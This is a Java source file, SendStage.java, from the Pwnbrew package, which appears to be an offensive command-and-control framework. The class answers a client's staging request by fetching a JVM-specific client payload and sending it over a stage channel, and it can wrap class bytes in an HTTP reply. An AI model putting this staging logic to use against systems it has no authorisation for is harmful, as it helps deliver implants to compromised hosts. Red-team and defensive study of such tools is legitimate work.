/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

/*
* SendStage.java
*
* Created on Oct 7, 2013, 10:12:33 PM
*/

package pwnbrew.network.stage;

import pwnbrew.network.stage.Payload;
import java.io.UnsupportedEncodingException;
import java.nio.ByteBuffer;
import java.util.logging.Level;
import pwnbrew.log.Log;
import pwnbrew.manager.ConnectionManager;
import pwnbrew.manager.DataManager;
import pwnbrew.manager.PortManager;
import pwnbrew.network.ControlOption;
import pwnbrew.network.PortRouter;
import pwnbrew.network.control.ControlMessageManager;
import pwnbrew.network.http.Http;
import pwnbrew.network.stage.StageMessage;
import pwnbrew.selector.SocketChannelHandler;
import pwnbrew.utilities.Utilities;

/**
 *
 *  
 */
public final class SendStage extends StageMessage { // NO_UCD (use default)
    
    private static final byte OPTION_JVM_VERSION = 16;   
    protected static final String NAME_Class = SendStage.class.getSimpleName();
    private String theJvmVersion;
  
    // ==========================================================================
    /**
     * Constructor
     *
     * @param dstHostId
    */
    public SendStage( int dstHostId ) {
        super( dstHostId );
    }
    
     // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public SendStage(byte[] passedId ) {
        super( passedId );
    }
    
    //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){      
        
        boolean retVal = true;
        try {
            byte[] theValue = tempTlv.getValue();
            switch( tempTlv.getType()){
                case OPTION_JVM_VERSION:
                     theJvmVersion = new String( theValue, "US-ASCII");
                    break;
                default:
                    retVal = false;
                    break;              
            }
        } catch (UnsupportedEncodingException ex) {
            ex = null;
        }        
        return retVal;
    }  
    
      
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( PortManager passedManager ) {       
            
        ControlMessageManager aCMManager = ControlMessageManager.getMessageManager();
        if( aCMManager != null ){

            PortRouter aPR = passedManager.getPortRouter( aCMManager.getPort());
            try {
                //Get the socketchannel handler
                int srcHostId = getSrcHostId();
                ConnectionManager aCM = aPR.getConnectionManager(srcHostId);
                if( aCM != null ){
                    SocketChannelHandler aSCH = aCM.getSocketChannelHandler( ConnectionManager.STAGE_CHANNEL_ID );

                    //Turn on staging flag and send the payload if it isn't relayed
                    if( aSCH != null && aSCH.setStaging(srcHostId, true, theJvmVersion) ) {
                        Payload aPayload = Utilities.getClientPayload(srcHostId, theJvmVersion);
                        if( aPayload != null )
                            DataManager.send(passedManager,aPayload);
                        else
                            Log.log(Level.SEVERE, NAME_Class, "evaluate()", "Unable to retrieve payload, ensure one has been loaded into the library", null );

                    }
                } else
                    Log.log(Level.SEVERE, NAME_Class, "evaluate()", "No connection manager for the specified host id.", null );

            } catch (UnsupportedEncodingException ex) {
            }
        }
 
    }
    
        
    
    //======================================================================
    /**
     * 
     * @param classBytes
     * @return 
     */
    private ByteBuffer constructReply( byte[] classBytes ){
       
         //Allocate and add the bytes from the message
        Http aHttpMsg = Http.getGeneric( Http._200 );
        
        //Set the bytes
        if( classBytes.length > 0 ){         
             
            aHttpMsg.setPayloadBytes( classBytes );                    
            aHttpMsg.setOption( Http.CONTENT_LENGTH, Integer.toString(classBytes.length) );
         
        }
        
        //Allocate enough space
        int httpLen = aHttpMsg.getLength();
        ByteBuffer aByteBuffer = ByteBuffer.allocate( httpLen );
        
        //Add the bytes
        aHttpMsg.append(aByteBuffer);
        return aByteBuffer;
    }

}
